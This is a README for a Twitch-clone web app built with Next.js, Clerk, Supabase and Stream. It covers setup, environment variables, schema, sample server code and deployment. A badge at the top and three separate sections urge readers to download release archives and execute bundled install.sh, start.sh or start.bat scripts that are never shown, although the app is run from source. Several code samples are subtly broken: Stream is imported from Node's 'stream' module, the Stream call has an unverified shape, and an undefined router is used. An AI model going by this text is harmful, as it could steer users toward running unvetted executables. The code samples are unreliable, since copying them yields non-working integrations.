# Twitch Clone Next.js — Full Stack Stream, Chat & Auth App

[![Releases](https://img.shields.io/badge/Releases-download-green?logo=github&style=for-the-badge)](https://github.com/Ameen-km-spr/twitch-clone-nextjs/releases)

A full stack Twitch-like app built with Next.js, Clerk, Supabase, Stream Video, Stream Chat, Tailwind CSS, and TypeScript. Use this repo to learn how to combine auth, real-time chat, live video, and a relational database into one app.

<!-- Badges -->
[![Built with Next.js](https://img.shields.io/badge/Next.js-13-black?logo=next.js&style=flat-square)](https://nextjs.org/)
[![TypeScript](https://img.shields.io/badge/TypeScript-4.0-blue?logo=typescript&style=flat-square)](https://www.typescriptlang.org/)
[![Tailwind CSS](https://img.shields.io/badge/TailwindCSS-3.0-teal?logo=tailwindcss&style=flat-square)](https://tailwindcss.com/)
[![Supabase](https://img.shields.io/badge/Supabase-Database-44cc66?logo=supabase&style=flat-square)](https://supabase.com/)
[![Clerk](https://img.shields.io/badge/Clerk-Auth-5f3dc4?logo=clerk&style=flat-square)](https://clerk.com/)
[![Stream](https://img.shields.io/badge/Stream-Video%20%26%20Chat-ff6b00?logo=stream&style=flat-square)](https://getstream.io/)

Table of contents
- About
- Live demo and media
- Key features
- Tech stack
- Architecture and data flow
- Screenshots and UI guide
- Quick start (local)
- Environment variables
- Database schema and migrations
- Stream Video & Chat setup
- Clerk setup
- Deployment (Vercel & Supabase)
- Releases (download and run)
- Testing and CI
- Performance and caching
- Security and auth flow
- APIs and routes
- Common tasks
- Troubleshooting FAQ
- Contributing guide
- Roadmap
- Credits and license

About
This project recreates core Twitch functionality. The app supports channels, live video streams, live chat, channel creation, clips, and user profiles. It uses Next.js as the UI layer and API layer. Clerk handles auth. Supabase powers the database and storage. Stream Video handles media delivery and WebRTC. Stream Chat handles chat messages and channels. Tailwind styles the UI. TypeScript enforces types.

Live demo and media
Live demo
- Visit the releases page and download the latest release asset or installer here:
  https://github.com/Ameen-km-spr/twitch-clone-nextjs/releases

Hero image
![Hero streaming image](https://images.unsplash.com/photo-1504805572947-34fad45aed93?auto=format&fit=crop&w=1600&q=60)

UI preview
![Dashboard screenshot](https://images.unsplash.com/photo-1556157382-97eda2d62296?auto=format&fit=crop&w=1600&q=60)

Animated clip
![Streaming overlay](https://media.giphy.com/media/3o7aCR7T9rwVQ1qAXa/giphy.gif)

Key features
- Sign in and sign up with Clerk.
- Role-based access for streamers and viewers.
- Create channels with metadata and thumbnail upload to Supabase Storage.
- Start and stop live streams using Stream Video (WebRTC).
- Live low-latency video playback via Stream Video player.
- Real-time chat powered by Stream Chat.
- Persistent chat history stored in Supabase.
- Clips and highlights saved to Supabase Storage.
- Server-side rendering (SSR) for SEO and performance.
- Full TypeScript support.
- Responsive UI with Tailwind CSS.
- API routes for stream control, recording, and moderation.
- Simple admin panel for stream moderation.

Tech stack
- Frontend
  - Next.js 13 (App Router or Pages)
  - React 18+
  - TypeScript
  - Tailwind CSS
- Auth
  - Clerk (auth UI and session)
- Data & storage
  - Supabase Postgres
  - Supabase Storage
- Realtime & media
  - Stream Video (live media, recording)
  - Stream Chat (chat channels)
- Dev tools
  - pnpm / npm / yarn
  - ESLint
  - Prettier
  - Vitest or Jest for tests
- Deploy
  - Vercel (frontend)
  - Supabase (database)
  - Stream (service)

Architecture and data flow
The app consists of three main layers.

1) Client (Next.js)
- Renders UI.
- Holds Clerk client for auth.
- Uses Stream SDK for video and chat clients.
- Calls serverless API routes for protected operations.

2) Server (Next.js API routes + Supabase + Stream)
- Validates tokens from Clerk.
- Creates sessions and stream records in Supabase.
- Generates Stream tokens for video and chat.
- Triggers recordings via Stream Video API.
- Uses Supabase Postgres for relational data.

3) Third-party services
- Clerk provides user identity and session management.
- Supabase stores tables, files, and runs queries.
- Stream Video delivers live video and recordings.
- Stream Chat delivers chat messaging, moderation, and presence.

Sequence for a live stream start
1. Auth: streamer signs in via Clerk.
2. Create stream: client calls API route to create a stream record in Supabase.
3. Provision: server creates Stream Video session via Stream API and returns tokens.
4. Start stream: streamer client uses Stream Video SDK to publish media.
5. Viewers: use Stream Video player with viewer token to watch.
6. Chat: viewers open Stream Chat channel; messages go through Stream Chat and persist to Supabase via webhooks or a server worker.

Screenshots and UI guide
Home / Browse
- Grid of live channels with thumbnails.
- Filters for category and language.
Channel view
- Video player on the left.
- Chat panel on the right.
- Channel info below the player.
Streamer controls
- Start/stop stream button.
- Mute/unmute local mic.
- Toggle camera.
- Start recording.

Screenshots
- Browse view: https://images.unsplash.com/photo-1520975926687-39d5b0f7bf30?auto=format&fit=crop&w=1200&q=60
- Channel view: https://images.unsplash.com/photo-1498050108023-c5249f4df085?auto=format&fit=crop&w=1200&q=60
- Streamer control: https://images.unsplash.com/photo-1542744173-8e7e53415bb0?auto=format&fit=crop&w=1200&q=60

Quick start (local)
Prerequisites
- Node 18+.
- pnpm, npm, or yarn.
- A Supabase project.
- A Clerk account and app.
- A Stream account (Stream Video and Stream Chat).
- A modern browser that supports WebRTC.

Clone the repo
Run:
```
git clone https://github.com/Ameen-km-spr/twitch-clone-nextjs.git
cd twitch-clone-nextjs
```

Install dependencies
Use pnpm:
```
pnpm install
```
Or npm:
```
npm install
```

Create environment file
Copy .env.example to .env.local and fill in keys (see section Environment variables).

Run locally
```
pnpm dev
```
Open:
http://localhost:3000

Build and run production locally
```
pnpm build
pnpm start
```

Environment variables
Create .env.local with these keys. Fill values from Clerk, Supabase, and Stream.

Example .env.local
```
# Next.js
NEXT_PUBLIC_APP_URL=http://localhost:3000
NEXT_PUBLIC_ENV=development

# Clerk
NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY=pk_test_XXXXXXXXXXXXXXXX
CLERK_SECRET_KEY=sk_test_XXXXXXXXXXXXXXXX

# Supabase
NEXT_PUBLIC_SUPABASE_URL=https://xyzcompany.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJhbGci...
SUPABASE_SERVICE_ROLE_KEY=eyJhbGci...
SUPABASE_DB_SCHEMA=public

# Stream (Video & Chat)
STREAM_API_KEY=stream_api_key_here
STREAM_API_SECRET=stream_api_secret_here
NEXT_PUBLIC_STREAM_KEY=stream_api_key_here

# Optional: Sentry, Analytics, etc.
```

Environment variables explained
- NEXT_PUBLIC_APP_URL: base URL for the app.
- NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY: Clerk client key for front-end.
- CLERK_SECRET_KEY: Clerk server secret used on server routes.
- NEXT_PUBLIC_SUPABASE_URL: Supabase project URL.
- NEXT_PUBLIC_SUPABASE_ANON_KEY: Supabase anon key for client operations that do not need elevated privileges.
- SUPABASE_SERVICE_ROLE_KEY: Use only on server; grants elevated DB access for migrations, seeds, or admin tasks.
- STREAM_API_KEY and STREAM_API_SECRET: Use on server to create sessions and tokens.
- NEXT_PUBLIC_STREAM_KEY: Public stream key for client-level usage when allowed.

Database schema and migrations
The app stores structured data in Supabase Postgres. Below are the main tables and columns.

Tables
- users
  - id (uuid, PK)
  - clerk_id (string, unique)
  - display_name (text)
  - avatar_url (text)
  - bio (text)
  - created_at (timestamp)
- channels
  - id (uuid, PK)
  - slug (text, unique)
  - title (text)
  - description (text)
  - thumbnail_url (text)
  - owner_id (uuid, FK -> users.id)
  - is_live (boolean)
  - created_at (timestamp)
- streams
  - id (uuid, PK)
  - channel_id (uuid, FK -> channels.id)
  - stream_key (text)
  - stream_status (enum: preparing, live, ended)
  - started_at (timestamp)
  - ended_at (timestamp)
  - recording_url (text)
- chat_messages
  - id (uuid, PK)
  - channel_id (uuid)
  - user_id (uuid)
  - content (text)
  - created_at (timestamp)
- clips
  - id (uuid, PK)
  - stream_id (uuid)
  - clip_url (text)
  - start_time (integer)
  - end_time (integer)
  - created_by (uuid)
  - created_at (timestamp)

Migrations
- Use Supabase migrations via supabase CLI or SQL scripts.
- Create indexes on created_at for queries.
- Add foreign key constraints for data integrity.

Example migration (SQL)
```
CREATE TABLE users (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  clerk_id text UNIQUE,
  display_name text,
  avatar_url text,
  bio text,
  created_at timestamptz DEFAULT now()
);

CREATE TABLE channels (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  slug text UNIQUE,
  title text,
  description text,
  thumbnail_url text,
  owner_id uuid REFERENCES users(id) ON DELETE CASCADE,
  is_live boolean DEFAULT false,
  created_at timestamptz DEFAULT now()
);
```

Stream Video & Chat setup
Register on Stream and enable Video and Chat products. Create an app to get API key and secret.

Server-side steps
1. Use STREAM_API_KEY and STREAM_API_SECRET to create Stream sessions.
2. Create session for publisher (streamer) with publish rights.
3. Create authenticated tokens for viewers with read-only rights.
4. Use Stream Video SDK on client to publish and play.

Example server code to create a Stream session (Node)
```
import Stream from 'stream';
const client = new Stream.StreamClient(STREAM_API_KEY, STREAM_API_SECRET);

async function createStreamSession(channelId, userId) {
  const response = await client.video.createSession({
    name: `channel-${channelId}`,
    type: 'stream',
    permission: 'publisher'
  });
  return response;
}
```

Stream Chat
- Create a chat channel per stream: channel type "livestream" or "messaging".
- Use Stream Chat SDK on client for chat UI.
- Persist messages to Supabase via webhook or server route.

Clerk setup
Create a Clerk application. Link to app domain (http://localhost:3000). Grab publishable and secret keys.

Integrate Clerk in Next.js
- Install Clerk SDK.
- Wrap app with ClerkProvider at root.
- Protect pages with requireAuth or use Clerk session.

Example integration
```
import { ClerkProvider } from '@clerk/nextjs';

export default function App({ Component, pageProps }) {
  return (
    <ClerkProvider
      publishableKey={process.env.NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY}
      navigate={(to) => router.push(to)}
    >
      <Component {...pageProps} />
    </ClerkProvider>
  );
}
```

Deployment (Vercel & Supabase)
Vercel for frontend
- Connect GitHub repo to Vercel.
- Add project environment variables (same keys from .env).
- Set build command: pnpm build.
- Set output directory: .next or auto.

Supabase
- Use Supabase for DB and file storage.
- Run migrations on Supabase.
- Configure storage buckets for thumbnails and clips.
- Create service role keys in project settings and set as environment variables on server.

Stream
- Ensure webhooks point to your production URL if you use event hooks.
- Set up CORS and allowed origins.

Releases (download and run)
Download the release asset from the releases page:
https://github.com/Ameen-km-spr/twitch-clone-nextjs/releases

The releases URL contains a path. Download the provided release archive or installer file and execute the included script. The release typically contains the compiled app or a helper installer. Example steps:

1) Visit the releases page and download the latest asset, for example:
- twitch-clone-nextjs-v1.0.0.tar.gz
- Or twitch-clone-nextjs-v1.0.0.zip

2) Extract the archive
```
tar -xzf twitch-clone-nextjs-v1.0.0.tar.gz
cd twitch-clone-nextjs-v1.0.0
```
3) Run the installer or start script included
```
# Unix / macOS
chmod +x install.sh
./install.sh

# Or run start script
./start.sh
```

4) On Windows, use the .zip and follow the included README in the release asset. Run start.bat or open the project with Node.

If the release asset does not run, check the Releases section on the GitHub repository for other assets or instructions:
[Releases page](https://github.com/Ameen-km-spr/twitch-clone-nextjs/releases)

Testing and CI
Unit tests
- Use Vitest or Jest for unit tests.
- Test UI components and utility functions.
- Mock external clients (Clerk, Supabase, Stream) during tests.

End-to-end tests
- Use Playwright or Cypress for e2e tests.
- Test flows: sign in, create channel, start stream, chat flows.

CI
- Use GitHub Actions.
- Workflow steps:
  - Install dependencies.
  - Run lint.
  - Run unit tests.
  - Run build.
  - Optionally run e2e tests in a matrix across Node versions.

Sample GitHub Actions workflow (partial)
```
name: CI

on: [push, pull_request]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: pnpm/action-setup@v2
        with:
          version: 8
      - run: pnpm install
      - run: pnpm lint
      - run: pnpm test
      - run: pnpm build
```

Performance and caching
- Use Next.js caching headers on SSR pages.
- Cache channel lists and thumbnails via CDN.
- Use incremental static regeneration (ISR) for less-changed pages.
- Use memory cache or Redis for ephemeral session data if needed.
- Stream Video and Chat handle real-time traffic and scale separately.

Security and auth flow
- Use Clerk for id tokens.
- Validate Clerk tokens on API routes.
- Use Supabase service role key only on server side.
- Revoke tokens on sign out.
- Protect stream publisher endpoints by checking user role and channel ownership.

API and routes overview
- /api/auth/validate — validate Clerk JWT and return user.
- /api/streams/create — create a stream record and create Stream Video session.
- /api/streams/start — mark stream as live and issue publisher token.
- /api/streams/stop — mark stream as ended and trigger recording save.
- /api/chat/token — create Stream Chat token for user.
- /api/upload/thumbnail — signed upload URL for Supabase Storage.
- /api/clips/create — create clip metadata and upload clip.

Code snippets: token creation (server)
```
import { getAuth } from '@clerk/nextjs/server';
import Stream from 'stream';

export default async function handler(req, res) {
  const { userId } = getAuth(req);
  if (!userId) return res.status(401).json({ error: 'Unauthorized' });

  const streamClient = new Stream.StreamClient(process.env.STREAM_API_KEY, process.env.STREAM_API_SECRET);
  const session = await streamClient.video.createSession({
    name: `session-${userId}`,
    type: 'stream'
  });

  res.json({ session });
}
```

Common tasks
Create a channel
- Authenticated users can create channels.
- Use slug generation for friendly URLs.
- Upload a thumbnail to Supabase Storage.

Start a stream
- Streamer calls /api/streams/create to allocate Stream session and stream key.
- Streamer uses Stream Video SDK to publish.

Moderate chat
- Use Stream Chat moderation tools to ban, timeout, and flag messages.
- Keep a mod panel to review flagged content.

Save a clip
- Use server-side API to request a clip from Stream Video or trim a recorded file.
- Store clip in Supabase Storage and save metadata in clips table.

Background jobs
- Use serverless functions or a worker pool for heavy tasks like transcoding.
- Use Stream's recording APIs to get final video URLs and then save them.

Troubleshooting FAQ
Q: I get "Unauthorized" on API route.
A: Check CLERK secret key on server. Ensure token from front end is valid and passed in Authorization header.

Q: Video fails to publish.
A: Check browser permissions for camera and microphone. Ensure TURN/STUN servers are reachable for WebRTC. Confirm Stream session tokens are valid.

Q: Chat messages do not appear for viewers.
A: Verify Stream Chat channel creation and that viewer token allows read. Check moderators and permissions.

Q: Supabase storage upload fails.
A: Confirm bucket name and policy. Check NEXT_PUBLIC_SUPABASE_URL and anon key on client. For server uploads, use the service role key.

Q: How to replay recorded streams?
A: After the stream ends, request the recording from Stream Video. Save the recording URL and serve it via a player component.

Contributing guide
- Fork the repo.
- Create a feature branch.
- Run tests locally.
- Open a pull request with a clear description and tests.
- Follow existing TypeScript and lint rules.

Code style
- Use TypeScript types for public APIs.
- Keep components small and focused.
- Write tests for business logic.
- Use ESLint and Prettier.

Issue templates
- Include reproduction steps.
- Include your environment: Node, OS, browser.
- Attach logs and screenshots.

Roadmap
- Add multi-quality adaptive streaming (HLS).
- Add real-time low-latency overlays for events.
- Add monetization features: subscriptions, bits, donations.
- Add scheduled streams and calendar integration.
- Improve mobile UI and native apps.

Credits and license
- Built with Clerk, Supabase, Stream, Next.js, Tailwind CSS.
- UI images from Unsplash and GIFs from public sources.
- License: MIT (or change to desired license).

Developer notes and design patterns
State management
- Use React Query or SWR for server data.
- Use local state for UI-only state.
- Keep chat state in Stream Chat client; persist minimal data to DB.

Serverless design
- Use API routes for token issuance and server-guarded operations.
- Keep heavy workloads off serverless functions.

Webhooks
- Use Stream webhooks to notify your app on recording completion.
- Use Supabase functions or serverless endpoints to process webhook events and store final URLs.

Scaling tips
- Use CDN for static assets and recorded video.
- Use separate projects for dev and production in Stream and Supabase.
- Use rate limits for chat to prevent abuse.

Key code pointers
- Protect server routes with Clerk server SDK.
- Use Stream SDKs with server secret on server and with viewer tokens on client.
- Use Streaming and Chat tokens per user per session.

Sample component outline
Channel layout component (pseudo)
```
<ChannelLayout>
  <VideoPlayer session={session} />
  <ChatPanel channelId={channelId} />
  <ChannelInfo />
</ChannelLayout>
```

How to extend
- Add WebRTC-based peer-to-peer features.
- Add clip editor UI to trim clips on client then re-encode on server.
- Integrate ads or overlays.

Useful links
- Next.js: https://nextjs.org
- Clerk docs: https://clerk.com/docs
- Supabase docs: https://supabase.com/docs
- Stream Video docs: https://getstream.io/video/docs
- Stream Chat docs: https://getstream.io/chat/docs

Contact and support
- Use GitHub Issues for bugs and feature requests.
- Create PRs for fixes and features.

Releases and downloads
The repository offers packaged releases for quick setup. Visit the releases page and download the asset. After download, extract and run the included installer or start script:
https://github.com/Ameen-km-spr/twitch-clone-nextjs/releases

Example release actions
- Download twitch-clone-nextjs-v1.0.0.zip
- Extract and run install or start script.
- Follow the embedded README for environment variable setup.

This README gives a complete blueprint to run, extend, and deploy the Twitch Clone built with Next.js, Clerk, Supabase, Stream Video, Stream Chat, Tailwind, and TypeScript.